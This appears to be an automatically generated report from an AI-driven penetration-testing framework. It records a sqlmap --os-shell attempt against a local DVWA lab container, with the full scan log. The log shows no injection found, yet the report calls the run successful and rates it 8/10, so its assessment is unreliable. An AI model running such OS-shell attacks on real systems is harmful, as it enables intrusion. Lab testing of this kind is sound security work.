# sqlmap-os-shell

## Tool Name & Category
- **Name:** sqlmap-os-shell
- **Category:** exploit (Exploit Generation — Metasploit, impacket, post-exploitation)
- **Binary:** `sqlmap`
- **Agent:** exploit
- **DVWA-optimized:** True

## Official Purpose
SQLmap OS shell attempt

## Exact Command(s) Executed
```bash
# Safety check: read-only/lab-safe against local Docker targets only
sqlmap -u 'http://aegis-target/vulnerabilities/sqli/?id=1' --os-shell --batch
```

**Target:** `http://aegis-target`  
**Duration:** 1.22s | **Exit code:** 0

## Full Output Summary
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:11:38 /2026-06-24/

[1/1] URL:
GET http://aegis-target/vulnerabilities/sqli/?id=1
do you want to test this URL? [Y/n/q]
> Y
[05:11:38] [INFO] testing URL 'http://aegis-target/vulnerabilities/sqli/?id=1'
[05:11:38] [INFO] using '/root/.local/share/sqlmap/output/results-06242026_0511am.csv' as the CSV results file in multiple targets mode
[05:11:38] [INFO] testing connection to the target URL
got a 302 redirect to 'http://aegis-target/login.php'. Do you want to follow? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=m1nvlisf0n3...48noi2i3l0;security=low;security=low'). Do you want to use those [Y/n] Y
[05:11:38] [INFO] testing if the target URL content is stable
[05:11:38] [WARNING] GET parameter 'id' does not appear to be dynamic
[05:11:38] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[05:11:38] [INFO] testing for SQL injection on GET parameter 'id'
[05:11:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:11:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:11:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:11:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:11:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:11:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:11:39] [INFO] testing 'Generic inline queries'
[05:11:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:11:39] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:11:39] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:11:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:11:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:11:39] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[05:11:39] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[05:11:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:11:39] [WARNING] GET parameter 'id' does not seem to be injectable
[05:11:39] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[05:11:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06242026_0511am.csv'

[*] ending @ 05:11:39 /2026-06-24/


```

## What I Learned / Edge Cases / Gotchas
- Executed successfully in isolated lab context
- Registry template: `sqlmap -u '{web}/vulnerabilities/sqli/?id=1' --os-shell --batch {extra}`
- Tags: none

## Effectiveness on This Target (1-10)
**8/10** — Strong signal on DVWA/Juice Shop

## Recommended Safe Parameters for Learning Labs
- --batch --risk=1 --level=1 for injection tools; -T4 for nmap; target=http://aegis-target only; no destructive flags
- Timeout: 90s (capped for batch run)
- Always scope to `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) from host
- Use `aegis-target` / `aegis-juice` hostnames from inside Kali container network

---
*GrokStrike v1.0 — 2026-06-24T05:11:39.392865+00:00*
